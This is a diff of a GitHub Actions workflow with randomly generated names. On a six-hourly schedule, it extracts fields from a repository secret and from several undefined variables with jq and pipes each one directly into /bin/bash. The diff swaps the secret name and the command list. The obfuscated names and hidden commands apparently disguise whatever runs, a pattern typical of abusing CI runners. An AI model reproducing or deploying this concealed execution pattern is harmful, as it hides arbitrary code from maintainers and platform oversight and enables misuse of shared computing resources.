@@ -1,32 +1,28 @@
 name: pengbaiyu2901
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
+    - cron: '41 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pengbaiyu2901
         env:
-          rleks529: ${{ secrets.rleks529 }}
+          qdwt1424: ${{ secrets.qdwt1424 }}
         run: |
-          echo $rleks529 | jq -r .betdc78 | /bin/bash
-          echo $wfhf0107 | jq -r .qb8 | /bin/bash
-          echo $m7 | jq -r .pcbbu952 | /bin/bash
-          echo $hvz917 | jq -r .ava8270 | /bin/bash
-          echo $cyyc7 | jq -r .e8946 | /bin/bash
-          echo $ln65027 | jq -r .p8 | /bin/bash
-          echo $nrl22 | jq -r .pfoh75 | /bin/bash
-          echo $yinqr52 | jq -r .ledm0 | /bin/bash
-          echo $ipus1383 | jq -r .hdka34 | /bin/bash
-          echo $oeq18 | jq -r .ioq0 | /bin/bash
-          echo $maz30660 | jq -r .lfkwf844 | /bin/bash
-          echo $zbht49961 | jq -r .ew9 | /bin/bash
-          echo $oe6 | jq -r .y07474 | /bin/bash
-          echo $nbti558 | jq -r .q91592 | /bin/bash
-          echo $wuv18412 | jq -r .smvh00225 | /bin/bash
+          echo $qdwt1424 | jq -r .byh81 | /bin/bash
+          echo $kao20 | jq -r .oympp072 | /bin/bash
+          echo $nrdb90084 | jq -r .c40 | /bin/bash
+          echo $jrql02309 | jq -r .orsz5 | /bin/bash
+          echo $ndvkw8 | jq -r .bki41 | /bin/bash
+          echo $bsx460 | jq -r .fraxh8076 | /bin/bash
+          echo $xlf8 | jq -r .dyoh7821 | /bin/bash
+          echo $j2 | jq -r .wqmh60 | /bin/bash
+          echo $kjy7 | jq -r .mhki1 | /bin/bash
+          echo $si505 | jq -r .nsdw0723 | /bin/bash
+          echo $nbcbq7944 | jq -r .o146 | /bin/bash
+          echo $l51 | jq -r .qt1 | /bin/bash
 
